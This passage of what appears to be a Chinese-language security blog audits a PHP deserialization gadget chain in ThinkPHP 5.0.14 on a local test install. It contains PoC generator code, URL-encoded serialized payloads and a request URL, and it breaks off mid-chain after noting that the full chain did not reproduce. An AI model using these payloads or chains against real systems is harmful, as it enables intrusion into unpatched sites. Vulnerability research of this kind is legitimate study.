+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://localhost/thinkphp_5.0.14/public/index.php/index/index/pop?dada=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A8%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A0%3A%7B%7Ds%3A40%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00fileHandles%22%3Ba%3A0%3A%7B%7Ds%3A38%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00readBytes%22%3Ba%3A2%3A%7Bi%3A1%3Bi%3A0%3Bi%3A2%3Bi%3A0%3B%7Ds%3A42%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00disableOutput%22%3Bb%3A1%3Bs%3A5%3A%22pipes%22%3Ba%3A0%3A%7B%7Ds%3A14%3A%22%00%2A%00inputBuffer%22%3Bs%3A0%3A%22%22%3Bs%3A8%3A%22%00%2A%00input%22%3BN%3Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CPipes%00blocked%22%3Bb%3A1%3B%7D<br></code></pre></td></tr></table></figure>
+
+<p>debug一下，发现能顺利断在我们下的断点处</p>
+<p><img src="/img/%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98/d34.png" srcset="/img/loading.gif" lazyload></p>
+<p>下一步会走到我们下断点的_destruct方法</p>
+<p>进入removeFiles方法，尝试传入$filename参数</p>
+<p>$filename是一个私有变量</p>
+<p>但是php是没有反射的能让我们反射修改变量</p>
+<p>这里严谨一点生成一个filename的setter方法供我们调用</p>
+<p>继续编写poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">poc</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$windows</span>=<span class="hljs-keyword">new</span> \think\process\pipes\<span class="hljs-title function_ invoke__">Windows</span>(<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;&quot;</span>);<br>    	<span class="hljs-comment">//files参数被定义为数组</span><br>    	<span class="hljs-variable">$windows</span>-&gt;<span class="hljs-title function_ invoke__">setFiles</span>(<span class="hljs-keyword">array</span>());<br>        <span class="hljs-variable">$poc</span>=<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$windows</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$poc</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>按照刚刚分析的思路，下一步会走到Model类的toString方法</p>
+<p>先示例化一下Model类</p>
+<p>但是这里Model类是一个抽象类，无法直接实例化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span> <span class="hljs-keyword">implements</span> \<span class="hljs-title">JsonSerializable</span>, \<span class="hljs-title">ArrayAccess</span></span><br></code></pre></td></tr></table></figure>
+
+<p>找到Model类的一个实现类Pivot，我们实例化这个类</p>
+<p>将$model作为参数放入setFiles中，对应我们刚刚分析的给unlink传入一个对象，触发该对象的toString方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">poc</span>(<span class="hljs-params"></span>)</span>&#123;<br>       <span class="hljs-variable">$model</span>=<span class="hljs-keyword">new</span> \think\model\<span class="hljs-title function_ invoke__">Pivot</span>();<br>       <span class="hljs-variable">$windows</span>=<span class="hljs-keyword">new</span> \think\process\pipes\<span class="hljs-title function_ invoke__">Windows</span>(<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;&quot;</span>);<br>       <span class="hljs-variable">$windows</span>-&gt;<span class="hljs-title function_ invoke__">setFiles</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$model</span>));<br>       <span class="hljs-variable">$poc</span>=<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$windows</span>));<br>       <span class="hljs-keyword">return</span> <span class="hljs-variable">$poc</span>;<br>   &#125;<br></code></pre></td></tr></table></figure>
+
+<p>依旧访问url执行poc方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/thinkphp_5.0.14/public/index.php/index/index/poc</span><br></code></pre></td></tr></table></figure>
+
+<p>得到序列化后的对象</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A8%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A35%3A%7Bs%3A6%3A%22parent%22%3BN%3Bs%3A21%3A%22%00%2A%00autoWriteTimestamp%22%3Bb%3A0%3Bs%3A13%3A%22%00%2A%00connection%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22%00%2A%00query%22%3BN%3Bs%3A7%3A%22%00%2A%00name%22%3Bs%3A5%3A%22Pivot%22%3Bs%3A8%3A%22%00%2A%00table%22%3BN%3Bs%3A8%3A%22%00%2A%00class%22%3Bs%3A17%3A%22think%5Cmodel%5CPivot%22%3Bs%3A8%3A%22%00%2A%00error%22%3BN%3Bs%3A11%3A%22%00%2A%00validate%22%3BN%3Bs%3A5%3A%22%00%2A%00pk%22%3BN%3Bs%3A8%3A%22%00%2A%00field%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00except%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00disuse%22%3Ba%3A0%3A%7B%7Ds%3A11%3A%22%00%2A%00readonly%22%3Ba%3A0%3A%7B%7Ds%3A10%3A%22%00%2A%00visible%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00hidden%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00append%22%3Ba%3A0%3A%7B%7Ds%3A7%3A%22%00%2A%00data%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00origin%22%3Ba%3A0%3A%7B%7Ds%3A11%3A%22%00%2A%00relation%22%3Ba%3A0%3A%7B%7Ds%3A7%3A%22%00%2A%00auto%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00insert%22%3Ba%3A0%3A%7B%7Ds%3A9%3A%22%00%2A%00update%22%3Ba%3A0%3A%7B%7Ds%3A13%3A%22%00%2A%00createTime%22%3Bs%3A11%3A%22create_time%22%3Bs%3A13%3A%22%00%2A%00updateTime%22%3Bs%3A11%3A%22update_time%22%3Bs%3A13%3A%22%00%2A%00dateFormat%22%3Bs%3A11%3A%22Y-m-d+H%3Ai%3As%22%3Bs%3A7%3A%22%00%2A%00type%22%3Ba%3A0%3A%7B%7Ds%3A11%3A%22%00%2A%00isUpdate%22%3Bb%3A0%3Bs%3A8%3A%22%00%2A%00force%22%3Bb%3A0%3Bs%3A14%3A%22%00%2A%00updateWhere%22%3BN%3Bs%3A16%3A%22%00%2A%00failException%22%3Bb%3A0%3Bs%3A17%3A%22%00%2A%00useGlobalScope%22%3Bb%3A1%3Bs%3A16%3A%22%00%2A%00batchValidate%22%3Bb%3A0%3Bs%3A16%3A%22%00%2A%00resultSetType%22%3Bs%3A5%3A%22array%22%3Bs%3A16%3A%22%00%2A%00relationWrite%22%3BN%3B%7D%7Ds%3A40%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00fileHandles%22%3Ba%3A0%3A%7B%7Ds%3A38%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00readBytes%22%3Ba%3A2%3A%7Bi%3A1%3Bi%3A0%3Bi%3A2%3Bi%3A0%3B%7Ds%3A42%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00disableOutput%22%3Bb%3A1%3Bs%3A5%3A%22pipes%22%3Ba%3A0%3A%7B%7Ds%3A14%3A%22%00%2A%00inputBuffer%22%3Bs%3A0%3A%22%22%3Bs%3A8%3A%22%00%2A%00input%22%3BN%3Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CPipes%00blocked%22%3Bb%3A1%3B%7D<br></code></pre></td></tr></table></figure>
+
+<p>把序列化数据传入dada变量</p>
+<p>动调一下看看</p>
+<p>能看到这里会按照我们预想的一样进入toArray方法</p>
+<p><img src="/img/%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98/d35.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来我们看看能否控制value变量</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$relation</span> = <span class="hljs-title class_">Loader</span>::<span class="hljs-title function_ invoke__">parseName</span>(<span class="hljs-variable">$name</span>, <span class="hljs-number">1</span>, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$relation</span>)) &#123;<br>    <span class="hljs-variable">$modelRelation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$relation</span>();<br>    <span class="hljs-variable">$value</span>         = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRelationData</span>(<span class="hljs-variable">$modelRelation</span>);<br></code></pre></td></tr></table></figure>
+
+<p>从代码上可以初步判断value的获取过程</p>
+<p>$value-&gt;$modelRelation-&gt;$relation-&gt;$name</p>
+<p>$name是从append中获得</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;append <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$name</span>)<br></code></pre></td></tr></table></figure>
+
+<p>下一个断点在这里查看能否顺利进入有关append的代码</p>
+<p><img src="/img/%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98/d36.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现走到这里就跳过了，因为我们还没有对append赋值</p>
+<p>生成setter函数，我们在poc中调用setAppend对其赋值</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">poc</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$model</span>=<span class="hljs-keyword">new</span> \think\model\<span class="hljs-title function_ invoke__">Pivot</span>();<br>        <span class="hljs-variable">$model</span>-&gt;<span class="hljs-title function_ invoke__">setAppend</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span>=&gt;<span class="hljs-string">&quot;b&quot;</span>));<br>        <span class="hljs-variable">$windows</span>=<span class="hljs-keyword">new</span> \think\process\pipes\<span class="hljs-title function_ invoke__">Windows</span>(<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-variable">$windows</span>-&gt;<span class="hljs-title function_ invoke__">setFiles</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$model</span>));<br>        <span class="hljs-variable">$poc</span>=<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$windows</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$poc</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>动调时看到name是我们输入的b，所以这里的name是我们可控的，value我们同样可控</p>
+<p><img src="/img/%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98/d37.png" srcset="/img/loading.gif" lazyload></p>
+<p>接下来的代码流程</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title class_">Loader</span>::<span class="hljs-title function_ invoke__">parseName</span>(<span class="hljs-variable">$name</span>, <span class="hljs-number">1</span>, <span class="hljs-literal">false</span>)<br><span class="hljs-comment">//将追加属性名转换为方法名(进行了一些去_之类的操作)</span><br><span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$relation</span>)    <br><span class="hljs-comment">//验证关联方法是否真实存在    </span><br><span class="hljs-variable">$modelRelation</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$relation</span>()    <br><span class="hljs-comment">//动态方法调用：使用变量作为方法名调用方法    </span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">// 假设在模型中定义了：</span><br><span class="hljs-comment">public function userInfo()</span><br><span class="hljs-comment">&#123;</span><br><span class="hljs-comment">    return $this-&gt;belongsTo(&#x27;User&#x27;, &#x27;user_id&#x27;);</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">// 这里相当于调用：</span><br><span class="hljs-comment">$modelRelation = $this-&gt;userInfo();</span><br><span class="hljs-comment">// 返回一个 BelongsTo 关联对象</span><br><span class="hljs-comment">*/</span>    <br><span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRelationData</span>(<span class="hljs-variable">$modelRelation</span>)    <br><span class="hljs-comment">//从关联对象中获取实际的数据 </span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">// 假设是 User 模型</span><br><span class="hljs-comment">$value = $this-&gt;getRelationData($modelRelation);</span><br><span class="hljs-comment">// 返回：User 模型实例，包含用户数据</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure>
+
+<p>也就是说我们这里可以通过控制name的值调用Model类的任意方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRelationData</span>(<span class="hljs-variable">$modelRelation</span>)<br></code></pre></td></tr></table></figure>
+
+<p>还需要调用的这个方法能够返回一个对象或者类</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$modelRelation</span>, <span class="hljs-string">&#x27;getBindAttr&#x27;</span>)) &#123;<br>	<span class="hljs-variable">$bindAttr</span> = <span class="hljs-variable">$modelRelation</span>-&gt;<span class="hljs-title function_ invoke__">getBindAttr</span>();<br>	<span class="hljs-keyword">if</span> (<span class="hljs-variable">$bindAttr</span>) &#123;<br>		<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$bindAttr</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$attr</span>) &#123;<br>			<span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$key</span>) ? <span class="hljs-variable">$attr</span> : <span class="hljs-variable">$key</span>;<br>			<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;data[<span class="hljs-variable">$key</span>])) &#123;<br>				<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;bind attr has exists:&#x27;</span> . <span class="hljs-variable">$key</span>);<br>			&#125; <span class="hljs-keyword">else</span> &#123;<br>				<span class="hljs-variable">$item</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-variable">$value</span> ? <span class="hljs-variable">$value</span>-&gt;<span class="hljs-title function_ invoke__">getAttr</span>(<span class="hljs-variable">$attr</span>) : <span class="hljs-literal">null</span>;<br>			&#125;<br></code></pre></td></tr></table></figure>
+
+<p>联系后续代码发现，调用的方法返回的对象或者类还需要存在getBindAttr方法</p>
+<p>同时我们需要在执行<code>$this-&gt;getRelationData($modelRelation)</code>时得到value可控</p>
+<p>我们找到getError方法</p>
+<p>在Model类中生成一个setError方法</p>
+<p>寻找存在getBindAttr方法的类</p>
+<p>找到OneToOne这个类存在getBindAttr方法</p>
+<p><img src="/img/%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98/d38.png" srcset="/img/loading.gif" lazyload></p>
+<p>但是这是一个抽象类，我们选择实例化他的实现类HasOne</p>
+<p>继续编写poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">poc</span>(<span class="hljs-params"></span>)</span>&#123;<br>	<span class="hljs-variable">$model</span>=<span class="hljs-keyword">new</span> \think\model\<span class="hljs-title function_ invoke__">Pivot</span>();<br>	<span class="hljs-variable">$error</span> = <span class="hljs-keyword">new</span> \think\model\relation\<span class="hljs-title function_ invoke__">HasOne</span>(<span class="hljs-keyword">new</span> \think\model\<span class="hljs-title function_ invoke__">Pivot</span>(),<br>		<span class="hljs-string">&#x27;\think\model\Pivot&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>	<span class="hljs-variable">$model</span>-&gt;<span class="hljs-title function_ invoke__">setError</span>(<span class="hljs-variable">$error</span>);<br>	<span class="hljs-variable">$model</span>-&gt;<span class="hljs-title function_ invoke__">setAppend</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span>=&gt;<span class="hljs-string">&quot;getError&quot;</span>));<br>	<span class="hljs-variable">$windows</span>=<span class="hljs-keyword">new</span> \think\process\pipes\<span class="hljs-title function_ invoke__">Windows</span>(<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;&quot;</span>);<br>	<span class="hljs-variable">$windows</span>-&gt;<span class="hljs-title function_ invoke__">setFiles</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$model</span>));<br>	<span class="hljs-variable">$poc</span>=<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$windows</span>));<br>	<span class="hljs-keyword">return</span> <span class="hljs-variable">$poc</span>;<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>看一下getRelationData方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getRelationData</span>(<span class="hljs-params">Relation <span class="hljs-variable">$modelRelation</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-built_in">parent</span> &amp;&amp; <span class="hljs-title function_ invoke__">get_class</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-built_in">parent</span>) == <span class="hljs-variable">$modelRelation</span>-&gt;<span class="hljs-title function_ invoke__">getModel</span>()) &#123;<br>		<span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-built_in">parent</span>;<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-comment">// 首先获取关联数据</span><br>		<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$modelRelation</span>, <span class="hljs-string">&#x27;getRelation&#x27;</span>)) &#123;<br>			<span class="hljs-variable">$value</span> = <span class="hljs-variable">$modelRelation</span>-&gt;<span class="hljs-title function_ invoke__">getRelation</span>();<br>		&#125; <span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">BadMethodCallException</span>(<span class="hljs-string">&#x27;method not exists:&#x27;</span> . <span class="hljs-title function_ invoke__">get_class</span>(<span class="hljs-variable">$modelRelation</span>) . <span class="hljs-string">&#x27;-&gt; getRelation&#x27;</span>);<br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">return</span> <span class="hljs-variable">$value</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到如果顺利返回$value那么就可以继续向下执行，调用HasOne类的不存在的getAttr方法，进而调用_call方法</p>
+<p><img src="/img/%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98/d39.png" srcset="/img/loading.gif" lazyload></p>
+<p>现在我们来用一个完整的poc走到这一步(填充所有需要的参数)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">poc</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$model</span> = <span class="hljs-keyword">new</span> \think\model\<span class="hljs-title function_ invoke__">Pivot</span>();<br>        <span class="hljs-variable">$append</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;a&quot;</span>=&gt;<span class="hljs-string">&quot;getError&quot;</span>);<br>        <span class="hljs-variable">$error</span> = <span class="hljs-keyword">new</span> \think\model\relation\<span class="hljs-title function_ invoke__">BelongsTo</span>(<span class="hljs-keyword">new</span> \think\model\<span class="hljs-title function_ invoke__">Merge</span>(),<br>            <span class="hljs-string">&#x27;\think\model\Merge&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-variable">$error</span>-&gt;<span class="hljs-title function_ invoke__">setRelation</span>(<span class="hljs-literal">false</span>);<br>        <span class="hljs-variable">$error</span>-&gt;<span class="hljs-title function_ invoke__">setModel</span>(<span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-variable">$error</span>-&gt;<span class="hljs-title function_ invoke__">setBindAttr</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;test&quot;</span>=&gt;<span class="hljs-string">&quot;xx&quot;</span>));<br>        <span class="hljs-variable">$query</span> = <span class="hljs-keyword">new</span> \think\db\<span class="hljs-title function_ invoke__">Query</span>();<br>        <span class="hljs-variable">$query</span>-&gt;<span class="hljs-title function_ invoke__">setModel</span>(<span class="hljs-keyword">new</span> \think\console\<span class="hljs-title function_ invoke__">Output</span>());<br>        <span class="hljs-variable">$error</span>-&gt;<span class="hljs-title function_ invoke__">setQuery</span>(<span class="hljs-variable">$query</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-keyword">new</span> \think\console\<span class="hljs-title function_ invoke__">Output</span>();<br>        <span class="hljs-variable">$model</span>-&gt;<span class="hljs-title function_ invoke__">setParent</span>(<span class="hljs-variable">$output</span>);<br>        <span class="hljs-variable">$model</span>-&gt;<span class="hljs-title function_ invoke__">setError</span>(<span class="hljs-variable">$error</span>);<br>        <span class="hljs-variable">$model</span>-&gt;<span class="hljs-title function_ invoke__">setAppend</span>(<span class="hljs-variable">$append</span>);<br>        <span class="hljs-variable">$files</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$model</span>);<br>        <span class="hljs-variable">$window</span> = <span class="hljs-keyword">new</span> \think\process\pipes\<span class="hljs-title function_ invoke__">Windows</span>(<span class="hljs-literal">true</span>,<span class="hljs-string">&quot;&quot;</span>);<br>        <span class="hljs-variable">$window</span>-&gt;<span class="hljs-title function_ invoke__">setFiles</span>(<span class="hljs-variable">$files</span>);<br>        <span class="hljs-variable">$x</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$window</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$x</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里没有复现成功</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$value</span>  = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getRelationData</span>(<span class="hljs-variable">$modelRelation</span>);<br>-&gt;<span class="hljs-variable">$value</span> = <span class="hljs-variable">$modelRelation</span>-&gt;<span class="hljs-title function_ invoke__">getRelation</span>();<br>-&gt;<span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getAttr</span>(<span class="hljs-variable">$name</span>);<br>-&gt;<span class="hljs-variable">$value</span>    = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getData</span>(<span class="hljs-variable">$name</span>);<br></code></pre></td></tr></table></figure>
+
+<p>经过一些关键代码没有获取到value的值，报错为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Method think\model<span class="hljs-title class_">\Pivot</span>::<span class="hljs-title function_ invoke__">__toString</span>() must not <span class="hljs-keyword">throw</span> an exception, caught think\exception\<span class="hljs-built_in">ErrorException</span>: <span class="hljs-title function_ invoke__">array_key_exists</span>(): The first argument should be either a <span class="hljs-keyword">string</span> <span class="hljs-keyword">or</span> an <span class="hljs-keyword">integer</span><br></code></pre></td></tr></table></figure>
+
+<p>研究了很久没有解决，先跳过看看_call的调用</p>
+<p>如果是正常执行，走到这一步</p>
+<p><img src="/img/%E5%AE%A1%E8%AE%A1%E5%AE%9E%E6%88%98/d40.png" srcset="/img/loading.gif" lazyload></p>
+<p>会去查找我们的$value设定的对象中有没有getAttr方法，我们刚刚找到的BelongsTo类中显然是没有的</p>
+<p>那么我们就可以通过给一些参数赋值来调用一些类的_call方法</p>
+<p>搜索语句</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"></span></span><br></code></pre></td></tr></table></figure>
+
+<p>这里不做一一筛选，直接来到Output类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> function <span class="hljs-title function_">__call</span><span class="hljs-params">($method, $args)</span><br>   &#123;<br>       <span class="hljs-keyword">if</span> (in_array($method, $<span class="hljs-built_in">this</span>-&gt;styles)) &#123;<br>           array_unshift($args, $method);<br>           <span class="hljs-keyword">return</span> call_user_func_array([$<span class="hljs-built_in">this</span>, <span class="hljs-string">&#x27;block&#x27;</span>], $args);<br>       &#125;<br><br>       <span class="hljs-keyword">if</span> ($<span class="hljs-built_in">this</span>-&gt;handle &amp;&amp; method_exists($<span class="hljs-built_in">this</span>-&gt;handle, $method)) &#123;<br>           <span class="hljs-keyword">return</span> call_user_func_array([$<span class="hljs-built_in">this</span>-&gt;handle, $method], $args);<br>       &#125; <span class="hljs-keyword">else</span> 